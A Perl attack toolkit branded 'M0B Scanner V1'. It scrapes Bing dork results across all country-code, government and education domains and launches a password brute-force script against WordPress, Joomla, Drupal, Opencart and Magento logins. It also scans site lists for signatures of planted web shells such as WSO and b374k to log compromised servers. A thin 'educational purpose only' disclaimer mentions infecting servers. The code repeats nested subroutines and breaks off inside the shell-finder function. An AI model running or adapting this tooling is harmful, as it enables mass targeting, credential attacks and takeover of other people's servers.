#!/usr/bin/env perl

use IO::Select;
use HTTP::Response;
use HTTP::Request::Common qw(GET);
use URI::URL;
use IO::Socket::INET;
use Term::ANSIColor qw(:constants);
use MIME::Base64;
use LWP;
use HTTP::Cookies;
use HTML::Entities;
use URI::URL;
use Getopt::Long;
use URI::Escape;
use Term::ANSIColor;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
use LWP::UserAgent;
use HTTP::Request::Common;
use Term::ANSIColor;
use HTTP::Request::Common qw(GET);
$ag = LWP::UserAgent->new();
use MIME::Base64;

#all folders needed here
$res="Result";
    if (-e $res)
    {
    }
    else
    {
        mkdir $res or die "ERROR: $res";
    }
    print color('reset');

$ress="dork";
    if (-e $ress)
    {
    }
    else
    {
        mkdir $ress or die "ERROR: $ress";
    }
$resss="result";
    if (-e $resss)
    {
    }
    else
    {
        mkdir $resss or die "ERROR: $resss";
    }
$tmp="tmp";
    if (-e $tmp)
    {
    }
    else
    {
        mkdir $tmp or die "ERROR: $tmp";
    }

if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }

#LOGO
$tool = ("TOOL V1");
@oni =("    
                   ███╗   ███╗ ██████╗ ██████╗ 
                   ████╗ ████║██╔═══██╗██╔══██╗
                   ██╔████╔██║██║   ██║██████╔╝
                   ██║╚██╔╝██║██║   ██║██╔══██╗
                   ██║ ╚═╝ ██║╚██████╔╝██████╔╝
                   ╚═╝     ╚═╝ ╚═════╝ ╚═════╝  $tool",
"                  
                    ███▄ ▄███▓ ▒█████   ▄▄▄▄   
                   ▓██▒▀█▀ ██▒▒██▒  ██▒▓█████▄ 
                   ▓██    ▓██░▒██░  ██▒▒██▒ ▄██
                   ▒██    ▒██ ▒██   ██░▒██░█▀  
                   ▒██▒   ░██▒░ ████▓▒░░▓█  ▀█▓
                   ░ ▒░   ░  ░░ ▒░▒░▒░ ░▒▓███▀▒ $tool",
"
                   ____________________________
                        _   _      __     ____  
                       /  /|    /    )   /   ) 
                   ---/| /-|---/----/---/__ /--
                     / |/  |  /    /   /    )  
                   _/__/___|_(____/___/____/___ $tool"
);

    print color('bold red');
#ADITIONAL WISDOMS
@are =("
                   If you only face forward,
                   there is something you will miss seeing.\n\n",
"
                   I want you to be happy. I want you to laugh a lot.
                   I don’t know what exactly I’ll be able to do for you,
                   but I’ll always be by your side.\n",
"
                   The world’s not perfect, but it’s there for us trying
                   the best it can. That’s what makes it so damn beautiful.\n\n",
"
                   The moment people come to know love, they run the risk 
                   of carrying hate.\n\n",
"
                   You are already dead.\n\n\n",
"
                   When you give up, that's when the game ends.\n\n\n",
"
                   There are no miracles in this world. There is only 
                   coincidence and necessity, and what people make of it.\n\n",
"
                   All we can do is live until the day we die.
                   Control what we can...and fly free!\n\n",
"
                   In this world, evil can arise from the best of intentions.
                   And there is good which can come from evil intentions\n\n",
"
                   I wish sadness could leave me just like how
                   fake friends always do\n\n",
"
                   Maybe we tried to leave as much memories with each other
                   because we knew one day we wouldn’t be together anymore\n\n",
"
                   Remembering something that no one else can is a painful
                   thing. You can’t talk to anyone about it. No one will 
                   understand you. You’ll be alone.\n",
"
                   Some angels are destined to fall\n\n\n",
"
                   Sometimes I thought “Do I deserve all of this hurt?”\n\n\n",
"
                   I used to believed in people but the only thing they
                   give back to me is the dawn hole in my heart\n\n",
"
                   almost everyone changes with time no matter
                   how much they’ve meant to you\n\n",
"
                   I’m rarely bored alone, I’m often bored in 
                   groups and crowds\n\n");


system("clear");
print $oni[rand @oni];
print colored("$are[rand @are]",'blue');

    print color('reset');

    print color('bold white');
    print color('reset');
print color("bold yellow"),"\nIf you found some scripting troubles, contact me : mobrinehayde5\@gmail.com\n\n";
print colored("[+]Warning : THIS TOOL IS FOR EDUCATIONNAL PURPOSE ONLY,\n   USING IT TO INFECT SERVERS IS NOT MY RESPONSABILITY.\n",'white on_red');
print color 'reset';
print colored("\n[1]-BING DORK SCANNER\n[2]-DORK BY COUNTRY\n[3]-BRUTE FORCE\n[4]-SHELL FINDER\n[5]-IP SCANNER FULL\n[6]-AUTO IP SCANNER + BRUTE FORCE\n[7]-AUTO DETECT CMS & EXPLOIT\nSELECT :",'black on_yellow');
print color 'reset';

my $sama = <STDIN>;
chomp $sama;

if($sama eq '1'){
bing();
}
if($sama eq '2'){
dork();
}
if($sama eq '3'){
redirect();
}
if($sama eq '4'){
shellfinder();
}
if($sama eq '5'){
ip();
}
if($sama eq '6'){
ipbr();
}
if($sama eq '7'){
bot();
}
########### bing search
sub bing(){
    print color('reset');
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }

print $oni[rand @oni];
print colored("$are[rand @are]",'blue');
    print color('bold red');

print $oni;

    print color('reset');

    print color('bold white');
    print color('reset');
print color("bold Green"), "M0B Scanner V1\n";
print color 'reset';
print color("bold yellow"),"IF you found some problems contact me : mobrinehayde5\@gmail.com\n\n";
print color 'reset';
print color("bold white"),"SELECT: \n1-SCAN BY COUNTRY \n2-SCAN GOV WEBSITES \n3-RANDOM?\n";
print color 'reset';

my $sama = <STDIN>;
chomp $sama;

if($sama eq '1'){
country();
}
if($sama eq '2'){
gov();
}

if($sama eq '3'){
random();
}

sub country(){
system('cls');

    print color('reset');
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }

print $oni[rand @oni];
print colored("$are[rand @are]",'blue');

    print color('bold red');
{
print $oni;

    print color('reset');

print "[FUCK THE WORLD]\n";
print "Dork:";
$dor=<STDIN>;
chomp($dor);
$dor=~s/ /+/g;

@country= ('ac', 'ad', 'ae', 'af', 'ag', 'ai', 'al', 'am', 'an', 'ao',
           'aq', 'ar', 'as', 'at', 'au', 'aw', 'ax', 'az', 'ba', 'bb',
           'bd', 'be', 'bf', 'bg', 'bh', 'bi', 'bj', 'bm', 'bn', 'bo',
           'br', 'bs', 'bt', 'bv', 'bw', 'by', 'bz', 'ca', 'cc', 'cd',
           'cf', 'cg', 'ch', 'ci', 'ck', 'cl', 'cm', 'cn', 'co', 'cr',
           'cu', 'cv', 'cx', 'cy', 'cz', 'de', 'dj', 'dk', 'dm', 'do',
           'dz', 'ec', 'ee', 'eg', 'eh', 'er', 'es', 'et', 'eu', 'fi',
           'fj', 'fk', 'fm', 'fo', 'fr', 'ga', 'gb', 'gd', 'ge', 'gf',
           'gg', 'gh', 'gi', 'gl', 'gm', 'gn', 'gp', 'gq', 'gr', 'gs',
           'gt', 'gu', 'gw', 'gy', 'hk', 'hm', 'hn', 'hr', 'ht', 'hu',
           'id', 'ie', 'il', 'im', 'in', 'io', 'iq', 'ir', 'is', 'it',
           'je', 'jm', 'jo', 'jp', 'ke', 'kg', 'kh', 'ki', 'km', 'kn',
           'kp', 'kr', 'kw', 'ky', 'kz', 'la', 'lb', 'lc', 'li', 'lk',
           'lr', 'ls', 'lt', 'lu', 'lv', 'ly', 'ma', 'mc', 'md', 'me',
           'mg', 'mh', 'mk', 'ml', 'mm', 'mn', 'mo', 'mp', 'mq', 'mr',
           'ms', 'mt', 'mu', 'mv', 'mw', 'mx', 'my', 'mz', 'na', 'nc',
           'ne', 'nf', 'ng', 'ni', 'nl', 'no', 'np', 'nr', 'nu', 'nz',
           'om', 'pa', 'pe', 'pf', 'pg', 'ph', 'pk', 'pl', 'pm', 'pn',
           'pr', 'ps', 'pt', 'pw', 'py', 'qa', 're', 'ro', 'rs', 'ru',
           'rw', 'sa', 'sb', 'sc', 'sd', 'se', 'sg', 'sh', 'si', 'sj',
           'sk', 'sl', 'sm', 'sn', 'so', 'sr', 'st', 'su', 'sv', 'sy',
           'sz', 'tc', 'td', 'tf', 'tg', 'th', 'tj', 'tk', 'tl', 'tm',
           'tn', 'to', 'tp', 'tr', 'tt', 'tv', 'tw', 'tz', 'ua', 'ug',
           'uk', 'um', 'us', 'uy', 'uz', 'va', 'vc', 've', 'vg', 'vi',
           'vn', 'vu', 'wf', 'ws', 'ye', 'yt', 'za', 'zm', 'zw');

OUTER: foreach $country(@country){
chomp $country;
$dork="$dor+site:$country";
print color("yellow"),"[Country : ";
print color('reset');
print color("white"),"$country]\n";
print color('reset');
gassone();
}
}

sub gassone(){
for ($ii = 1; $ii <= 2000; $ii+=10){

$url = "http://www.bing.com/search?q=$dork&filt=all&first=$ii&FORM=PERE";
$resp = $ag->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g){



$link = $1;
  if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
  {
        if ($link !~ /^http:/)
       {
        $link = 'http://' . "$link" . '/';
       }



if($link !~ /\"|\?|\=|index\.php/){
          if  (!  grep (/$link/,@result))
          {
print "$link\n";
open(savea, '>>result/all.txt');
    print savea "$link\n";
    close(savea);
  

            push(@result,$link);
}
}
}
}
}
}


sub gov(){
system('cls');

    print color('reset');
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }

print $oni[rand @oni];
print colored("$are[rand @are]",'blue');

    print color('bold red');
{
print $oni;

    print color('reset');

print "[FUCK THE WORLD]\n";
print "Dork:";
$dor=<STDIN>;
chomp($dor);
$dor=~s/ /+/g;

@country= ('gov', 'gov.ac', 'gov.ad', 'gov.ae', 'gov.af', 'gov.ag', 'gov.ai', 'gov.al', 'gov.am', 'gov.an', 'gov.ao',
           'gov.aq', 'gov.ar', 'gov.as', 'gov.at', 'gov.au', 'gov.aw', 'gov.ax', 'gov.az', 'gov.ba', 'gov.bb',
           'gov.bd', 'gov.be', 'gov.bf', 'gov.bg', 'gov.bh', 'gov.bi', 'gov.bj', 'gov.bm', 'gov.bn', 'gov.bo',
           'gov.br', 'gov.bs', 'gov.bt', 'gov.bv', 'gov.bw', 'gov.by', 'gov.bz', 'gov.ca', 'gov.cc', 'gov.cd',
           'gov.cf', 'gov.cg', 'gov.ch', 'gov.ci', 'gov.ck', 'gov.cl', 'gov.cm', 'gov.cn', 'gov.co', 'gov.cr',
           'gov.cu', 'gov.cv', 'gov.cx', 'gov.cy', 'gov.cz', 'gov.de', 'gov.dj', 'gov.dk', 'gov.dm', 'gov.do',
           'gov.dz', 'gov.ec', 'gov.ee', 'gov.eg', 'gov.eh', 'gov.er', 'gov.es', 'gov.et', 'gov.eu', 'gov.fi',
           'gov.fj', 'gov.fk', 'gov.fm', 'gov.fo', 'gov.fr', 'gov.ga', 'gov.gb', 'gov.gd', 'gov.ge', 'gov.gf',
           'gov.gg', 'gov.gh', 'gov.gi', 'gov.gl', 'gov.gm', 'gov.gn', 'gov.gp', 'gov.gq', 'gov.gr', 'gov.gs',
           'gov.gt', 'gov.gu', 'gov.gw', 'gov.gy', 'gov.hk', 'gov.hm', 'gov.hn', 'gov.hr', 'gov.ht', 'gov.hu',
           'gov.id', 'gov.ie', 'gov.il', 'gov.im', 'gov.in', 'gov.io', 'gov.iq', 'gov.ir', 'gov.is', 'gov.it',
           'gov.je', 'gov.jm', 'gov.jo', 'gov.jp', 'gov.ke', 'gov.kg', 'gov.kh', 'gov.ki', 'gov.km', 'gov.kn',
           'gov.kp', 'gov.kr', 'gov.kw', 'gov.ky', 'gov.kz', 'gov.la', 'gov.lb', 'gov.lc', 'gov.li', 'gov.lk',
           'gov.lr', 'gov.ls', 'gov.lt', 'gov.lu', 'gov.lv', 'gov.ly', 'gov.ma', 'gov.mc', 'gov.md', 'gov.me',
           'gov.mg', 'gov.mh', 'gov.mk', 'gov.ml', 'gov.mm', 'gov.mn', 'gov.mo', 'gov.mp', 'gov.mq', 'gov.mr',
           'gov.ms', 'gov.mt', 'gov.mu', 'gov.mv', 'gov.mw', 'gov.mx', 'gov.my', 'gov.mz', 'gov.na', 'gov.nc',
           'gov.ne', 'gov.nf', 'gov.ng', 'gov.ni', 'gov.nl', 'gov.no', 'gov.np', 'gov.nr', 'gov.nu', 'gov.nz',
           'gov.om', 'gov.pa', 'gov.pe', 'gov.pf', 'gov.pg', 'gov.ph', 'gov.pk', 'gov.pl', 'gov.pm', 'gov.pn',
           'gov.pr', 'gov.ps', 'gov.pt', 'gov.pw', 'gov.py', 'gov.qa', 'gov.re', 'gov.ro', 'gov.rs', 'gov.ru',
           'gov.rw', 'gov.sa', 'gov.sb', 'gov.sc', 'gov.sd', 'gov.se', 'gov.sg', 'gov.sh', 'gov.si', 'gov.sj',
           'gov.sk', 'gov.sl', 'gov.sm', 'gov.sn', 'gov.so', 'gov.sr', 'gov.st', 'gov.su', 'gov.sv', 'gov.sy',
           'gov.sz', 'gov.tc', 'gov.td', 'gov.tf', 'gov.tg', 'gov.th', 'gov.tj', 'gov.tk', 'gov.tl', 'gov.tm',
           'gov.tn', 'gov.to', 'gov.tp', 'gov.tr', 'gov.tt', 'gov.tv', 'gov.tw', 'gov.tz', 'gov.ua', 'gov.ug',
           'gov.uk', 'gov.um', 'gov.us', 'gov.uy', 'gov.uz', 'gov.va', 'gov.vc', 'gov.ve', 'gov.vg', 'gov.vi',
           'gov.vn', 'gov.vu', 'gov.wf', 'gov.ws', 'gov.ye', 'gov.yt', 'gov.za', 'gov.zm', 'gov.zw',
'edu', 'edu.ac', 'edu.ad', 'edu.ae', 'edu.af', 'edu.ag', 'edu.ai', 'edu.al', 'edu.am', 'edu.an', 'edu.ao',
           'edu.aq', 'edu.ar', 'edu.as', 'edu.at', 'edu.au', 'edu.aw', 'edu.ax', 'edu.az', 'edu.ba', 'edu.bb',
           'edu.bd', 'edu.be', 'edu.bf', 'edu.bg', 'edu.bh', 'edu.bi', 'edu.bj', 'edu.bm', 'edu.bn', 'edu.bo',
           'edu.br', 'edu.bs', 'edu.bt', 'edu.bv', 'edu.bw', 'edu.by', 'edu.bz', 'edu.ca', 'edu.cc', 'edu.cd',
           'edu.cf', 'edu.cg', 'edu.ch', 'edu.ci', 'edu.ck', 'edu.cl', 'edu.cm', 'edu.cn', 'edu.co', 'edu.cr',
           'edu.cu', 'edu.cv', 'edu.cx', 'edu.cy', 'edu.cz', 'edu.de', 'edu.dj', 'edu.dk', 'edu.dm', 'edu.do',
           'edu.dz', 'edu.ec', 'edu.ee', 'edu.eg', 'edu.eh', 'edu.er', 'edu.es', 'edu.et', 'edu.eu', 'edu.fi',
           'edu.fj', 'edu.fk', 'edu.fm', 'edu.fo', 'edu.fr', 'edu.ga', 'edu.gb', 'edu.gd', 'edu.ge', 'edu.gf',
           'edu.gg', 'edu.gh', 'edu.gi', 'edu.gl', 'edu.gm', 'edu.gn', 'edu.gp', 'edu.gq', 'edu.gr', 'edu.gs',
           'edu.gt', 'edu.gu', 'edu.gw', 'edu.gy', 'edu.hk', 'edu.hm', 'edu.hn', 'edu.hr', 'edu.ht', 'edu.hu',
           'edu.id', 'edu.ie', 'edu.il', 'edu.im', 'edu.in', 'edu.io', 'edu.iq', 'edu.ir', 'edu.is', 'edu.it',
           'edu.je', 'edu.jm', 'edu.jo', 'edu.jp', 'edu.ke', 'edu.kg', 'edu.kh', 'edu.ki', 'edu.km', 'edu.kn',
           'edu.kp', 'edu.kr', 'edu.kw', 'edu.ky', 'edu.kz', 'edu.la', 'edu.lb', 'edu.lc', 'edu.li', 'edu.lk',
           'edu.lr', 'edu.ls', 'edu.lt', 'edu.lu', 'edu.lv', 'edu.ly', 'edu.ma', 'edu.mc', 'edu.md', 'edu.me',
           'edu.mg', 'edu.mh', 'edu.mk', 'edu.ml', 'edu.mm', 'edu.mn', 'edu.mo', 'edu.mp', 'edu.mq', 'edu.mr',
           'edu.ms', 'edu.mt', 'edu.mu', 'edu.mv', 'edu.mw', 'edu.mx', 'edu.my', 'edu.mz', 'edu.na', 'edu.nc',
           'edu.ne', 'edu.nf', 'edu.ng', 'edu.ni', 'edu.nl', 'edu.no', 'edu.np', 'edu.nr', 'edu.nu', 'edu.nz',
           'edu.om', 'edu.pa', 'edu.pe', 'edu.pf', 'edu.pg', 'edu.ph', 'edu.pk', 'edu.pl', 'edu.pm', 'edu.pn',
           'edu.pr', 'edu.ps', 'edu.pt', 'edu.pw', 'edu.py', 'edu.qa', 'edu.re', 'edu.ro', 'edu.rs', 'edu.ru',
           'edu.rw', 'edu.sa', 'edu.sb', 'edu.sc', 'edu.sd', 'edu.se', 'edu.sg', 'edu.sh', 'edu.si', 'edu.sj',
           'edu.sk', 'edu.sl', 'edu.sm', 'edu.sn', 'edu.so', 'edu.sr', 'edu.st', 'edu.su', 'edu.sv', 'edu.sy',
           'edu.sz', 'edu.tc', 'edu.td', 'edu.tf', 'edu.tg', 'edu.th', 'edu.tj', 'edu.tk', 'edu.tl', 'edu.tm',
           'edu.tn', 'edu.to', 'edu.tp', 'edu.tr', 'edu.tt', 'edu.tv', 'edu.tw', 'edu.tz', 'edu.ua', 'edu.ug',
           'edu.uk', 'edu.um', 'edu.us', 'edu.uy', 'edu.uz', 'edu.va', 'edu.vc', 'edu.ve', 'edu.vg', 'edu.vi',
           'edu.vn', 'edu.vu', 'edu.wf', 'edu.ws', 'edu.ye', 'edu.yt', 'edu.za', 'edu.zm', 'edu.zw');

OUTER: foreach $country(@country){
chomp $country;
$dork="$dor+site:$country";
print color("yellow"),"[Country : ";
print color('reset');
print color("white"),"$country]\n";
print color('reset');
gassone();
}
}

sub gassone(){
for ($ii = 1; $ii <= 2000; $ii+=10){

$url = "http://www.bing.com/search?q=$dork&filt=all&first=$ii&FORM=PERE";
$resp = $ag->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g){



$link = $1;
  if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
  {
        if ($link !~ /^http:/)
       {
        $link = 'http://' . "$link" . '/';
       }



if($link !~ /\"|\?|\=|index\.php/){
          if  (!  grep (/$link/,@result))
          {
print "$link\n";
open(savea, '>>result/all.txt');
    print savea "$link\n";
    close(savea);
  

            push(@result,$link);
}
}
}
}
}
}


sub random(){
system('cls');

    print color('reset');
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }

print $oni[rand @oni];
print colored("$are[rand @are]",'blue');

    print color('bold red');
{
print $oni;

    print color('reset');

print "[FUCK THE WORLD]\n";
print "Dork:";
$dor=<STDIN>;
chomp($dor);
$dor=~s/ /+/g;

@country= ("com","co","net","org","club","design","shop","site","online","io","me","us","ca","ac","academy","accountant","accountants","actor","adult","ae.org","ae","af","africa","ag","agency","am","apartments","com.ar","ar","archi","art","as","asia","associates","at","attorney","au","com.au","id.au","net.au","org.au","auction","band","bar","bargains","bayern","be","beer","berlin","best","bet","bid","bike","bingo","bio","biz","black","blog","blue","boutique","br","br.com","brussels","build","builders","business","buzz","bz","cab","cafe","caf","cam","camera","camp","capetown","capital","cards","care","career","careers","casa","cash","casino","catering","cc","center","ch","chat","cheap","church","city","cl","claims","cleaning","click","clinic","clothing","cloud","cm","cn.com","cn","uk","co.uk","coach","codes","coffee","college","cologne","community","company","computer","condos","construction","consulting","contractors","cooking","cool","country","coupons","courses","credit","cricket","cruises","cx","cz","dance","date","dating","de","deals","degree","delivery","democrat","dental","dentist","diamonds","digital","direct","directory","discount","dk","doctor","dog","domains","download","durban","earth","ec","eco","education","email","energy","engineer","engineering","enterprises","equipment","es","estate","eu","eu.com","events","exchange","expert","exposed","express","fail","faith","family","fans","farm","fashion","finance","financial","fish","fishing","fit","fitness","flights","florist","fm","football","forsale","foundation","fr","fun","fund","furniture","futbol","fyi","gallery","games","garden","gd","gg","gift","gifts","gives","gl","glass","global","gold","golf","gr","graphics","gratis","green","gripe","group","gs","guide","guru","gy","hamburg","haus","health","healthcare","help","hn","hockey","holdings","holiday","horse","hospital","host","house","how","ht","im","immo","immobilien","in","industries","info","ink","institude","insure","international","investments","is","it","je","jetzt","jewelry","joburg","jp","jpn.com","kaufen","kim","kitchen","kiwi","koeln","kyoto","la","land","lat","lawyer","lc","lease","legal","lgbt","li","life","lighting","limited","limo","link","live","loan","loans","lol","london","love","lt","ltd","lu","lv","maison","management","market","marketing","mba","media","melbourne","memorial","men","menu","miami","mn","mobi","moda","moe","mom","money","mortgage","ms","mu","mx","nagoya","name","network","news","ngo","ninja","nl","nu","nyc","nz","ac.nz","org.nz","kiwi.nz","net.nz","school.nz","gen.nz","geek.nz","co.nz","maori.nz","okinawa","one","onl","organic","osaka","paris","partners","parts","party","pe","pet","ph","photo","photography","photos","pics","pictures","pink","pizza","pl","place","plumbing","plus","pm","poker","porn","press","pro","productions","promo","properties","pt","pub","pw","qa","qpon","quebec","racing","re","recipes","red","rehab","reise","reisen","rent","rentals","repair","report","republican","rest","restaurant","review","reviews","rip","rocks","rodeo","ru","ru.com","run","ryukyu","sa.com","sa","sale","salon","sarl","sb","com.sb","sc","school","schule","science","scot","se","services","sexy","sg","com.sg","sh","shiksha","shoes","shopping","show","singles","ski","soccer","social","software","solar","solutions","soy","space","store","stream","studio","study","style","supplies","supply","support","surf","surgery","sx","sydney","systems","taipei","tattoo","tax","taxi","tc","team","tech","technology","tel","tennis","tf","theater","tienda","tips","tires","tk","tl","to","today","tokyo","tools","top","tours","town","toys","trade","trading","training","tube","tv","tw","tr","org.uk","me.uk","uk.com","university","uno","us.com","vacations","vc","vegas","ventures","vet","vg","viajes","video","villas","vin","vip","vision","vlaanderen","vodka","vote","voting","voyage","wales","wang","watch","webcam","website","wedding","wf","wien","wiki","win","wine","work","works","world","ws","wtf","在线","移动","ОРГ","中文网","机构","みんな","世界","游戏","企业","XYZ","YOGA","yokohama","yt","za","co.za","za.com","zone","ad","ai","al","an","ao","aq","aw","ax","az","ba","bb","bd","bf","bg","bh","bj","bl","bm","bn","bo","bq","bs","bt","bv","bw","by","bz","cd","cf","cg","ci","ck","cm","cr","cu","cv","cw","cx","cy","dj","dm","do","dz","ee","eg","eh","er","et","fi","fj","fk","fm","fo","ga","gb","gd","ge","gf","gg","gh","gi","gl","gm","gn","gp","gp","gs","gt","gu","gw","hk","hm","hr","ht","hu","id","ie","il","im","in","iq","ir","is","jm","jo","ke","kg","kh","ki","km","kn","kr","kw","ky","kz","lb","lk","lr","ls","lt","lv","ma","mc","md","mf","mg","mh","mk","ml","mm","mo","mp","mq","mr","mt","mu","mv","mw","my","mz","na","nc","ne","nf","ng","ni","no","np","nr","nu","om","pa","pf","pg","pk","pm","pn","pr","ps","pw","py","ro","rs","rw","sb","sc","sd","sh","si","sj","sk","sl","sm","sn","so","sr","ss","st","su","sv","sx","sy","sz","tc","td","tf","tg","th","tj","tm","tn","to","tt","tr","tz","ua","ug","um","uy","uz","va","vc","ve","vg","vi","vn","vu","wf","ws","ye","yt","zm","zw","blackfriday","alsace","amsterdam","bcn","barcelona","bayern","brussels","budapest","bzh","cat","cologne","corsica","cymru","eus","frl");

OUTER: foreach $country(@country){
chomp $country;
$dork="$dor+site:$country";
print color("yellow"),"[Country : ";
print color('reset');
print color("white"),"$country]\n";
print color('reset');
gassone();
}
}

sub gassone(){
for ($ii = 1; $ii <= 2000; $ii+=10){

$url = "http://www.bing.com/search?q=$dork&filt=all&first=$ii&FORM=PERE";
$resp = $ag->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g){



$link = $1;
  if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
  {
        if ($link !~ /^http:/)
       {
        $link = 'http://' . "$link" . '/';
       }



if($link !~ /\"|\?|\=|index\.php/){
          if  (!  grep (/$link/,@result))
          {
print "$link\n";
open(savea, '>>result/all.txt');
    print savea "$link\n";
    close(savea);
  

            push(@result,$link);
}
}
}
}
}
}
}
}
}
}
sub dork(){
system ("cls");
system ("dOcToR N!nja...");
system("clear");
print $oni[rand @oni];
print colored("$are[rand @are]",'blue');
    print "[DORK]\n";
    print "DORK:";
    $host = <STDIN>;
chomp($host);
print "\n\n";
print "\t\t#------------#  SAVED  #------------#\n";
print "\n\n";
@p = ('ac', 'ad', 'ae', 'af', 'ag', 'ai', 'al', 'am', 'an', 'ao',
           'aq', 'ar', 'as', 'at', 'au', 'aw', 'ax', 'az', 'ba', 'bb',
           'bd', 'be', 'bf', 'bg', 'bh', 'bi', 'bj', 'bm', 'bn', 'bo',
           'br', 'bs', 'bt', 'bv', 'bw', 'by', 'bz', 'ca', 'cc', 'cd',
           'cf', 'cg', 'ch', 'ci', 'ck', 'cl', 'cm', 'cn', 'co', 'cr',
           'cu', 'cv', 'cx', 'cy', 'cz', 'de', 'dj', 'dk', 'dm', 'do',
           'dz', 'ec', 'ee', 'eg', 'eh', 'er', 'es', 'et', 'eu', 'fi',
           'fj', 'fk', 'fm', 'fo', 'fr', 'ga', 'gb', 'gd', 'ge', 'gf',
           'gg', 'gh', 'gi', 'gl', 'gm', 'gn', 'gp', 'gq', 'gr', 'gs',
           'gt', 'gu', 'gw', 'gy', 'hk', 'hm', 'hn', 'hr', 'ht', 'hu',
           'id', 'ie', 'il', 'im', 'in', 'io', 'iq', 'ir', 'is', 'it',
           'je', 'jm', 'jo', 'jp', 'ke', 'kg', 'kh', 'ki', 'km', 'kn',
           'kp', 'kr', 'kw', 'ky', 'kz', 'la', 'lb', 'lc', 'li', 'lk',
           'lr', 'ls', 'lt', 'lu', 'lv', 'ly', 'ma', 'mc', 'md', 'me',
           'mg', 'mh', 'mk', 'ml', 'mm', 'mn', 'mo', 'mp', 'mq', 'mr',
           'ms', 'mt', 'mu', 'mv', 'mw', 'mx', 'my', 'mz', 'na', 'nc',
           'ne', 'nf', 'ng', 'ni', 'nl', 'no', 'np', 'nr', 'nu', 'nz',
           'om', 'pa', 'pe', 'pf', 'pg', 'ph', 'pk', 'pl', 'pm', 'pn',
           'pr', 'ps', 'pt', 'pw', 'py', 'qa', 're', 'ro', 'rs', 'ru',
           'rw', 'sa', 'sb', 'sc', 'sd', 'se', 'sg', 'sh', 'si', 'sj',
           'sk', 'sl', 'sm', 'sn', 'so', 'sr', 'st', 'su', 'sv', 'sy',
           'sz', 'tc', 'td', 'tf', 'tg', 'th', 'tj', 'tk', 'tl', 'tm',
           'tn', 'to', 'tp', 'tr', 'tt', 'tv', 'tw', 'tz', 'ua', 'ug',
           'uk', 'um', 'us', 'uy', 'uz', 'va', 'vc', 've', 'vg', 'vi',
           'vn', 'vu', 'wf', 'ws', 'ye', 'yt', 'za', 'zm', 'zw');

foreach $myadmin(@p){

$url = $host.$myadmin;
print "$host+site:$myadmin\n";
open(save, '>>dork/dork.txt');
    print save "$host+site:$myadmin\n";
    close(save);
            push(@result,$link);
		}

}

sub redirect() {
    print color('reset');
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }


    print color('bold red');

{
print $oni[rand @oni];
print colored("$are[rand @are]",'blue');

print colored("+------------------------------------------------------------------------+",'red'),"\n";
print colored("[+]BRUTE FORCE by M0B",'red'),"\n";
print colored("[+]WARNING: I don't take any responsability to use this tool for bypass",'blue'),"\n";
print colored("[+]WARNING: This tool don't get site admin username expect [WORDPRESS]",'blue'),"\n";
print colored("+------------------------------------------------------------------------+",'red'),"\n";
print "\n";
print "THIS BRUTE FORCE FOR [WordPress - Joomla - Drupal - Opencart - Magento]\n";}
print "LIST:";
$list=<STDIN>;
chomp($list);
system("perl xpl.pl -l $list -p passwords.txt")
}




sub shellfinder() {
################# INDEX  #############
 if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
print "\n";
print $oni[rand @oni];
print colored("$are[rand @are]",'blue');
print colored("+------------------------------------------------------------------------+",'red'),"\n";
print colored("[+]shell finder created by M0B",'red'),"\n";
print colored("[+]WARNING: I don't take any responsability to use this tool for bypass",'blue'),"\n";
print colored("[+]WARNING: This tool is not precise to found shells 100% , \n   You can find some errors :/",'blue'),"\n";
print colored("[+]WARNING: You need to write full link !!",'blue'),"\n";
print colored("+------------------------------------------------------------------------+",'red'),"\n";
print "\n";
 
########## PART WORK #################
print colored("[PUT YOUR LIST]: ",'red');
 
$lista=<STDIN>;
chomp($lista);
print "\n";
open (lista, "<$lista") || die "\n [LIST NOT FOUND]";
my @lista = <lista>;
close lista;
 
foreach $site(@lista) {
 
if($site !~ /http:\/\//) { $site = "$site/"; };
detect1();
}
sub detect1($site){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (8);
########################### shell
my $checar = $ua->get("$site")->content;
if($checar =~/K2LL33D SHELL|k2ll33d|uploader by ghost-dz|WSO 2.3|WSO 2.4|WSO 2.5|WSO 2.6|WSO 2.6|WSO 3.0|WSO 4.2.4|WSO 4.2.5|Upload file: [ Writeable ]|Uname:|Upload Form Yunkers Crew|Mr. DellatioNx196 GaLers xh3LL Backd00r 1.0|Fallagassrini|wp-content|Mister Spy Bypass Shell|bypass 1.0, Devloped By El Moujahidin|b374k|IndoXploit|Pro$helL|Jijle3 [PHDZ]|404-server!!|J3Dianas/) {
    print colored("[SHELL]: $site",'WHITE ON_CYAN'),"\n";
open(save, '>>Result/shell.txt');
    print save "$site\n";
    close(save);
}
########################## maybe shell
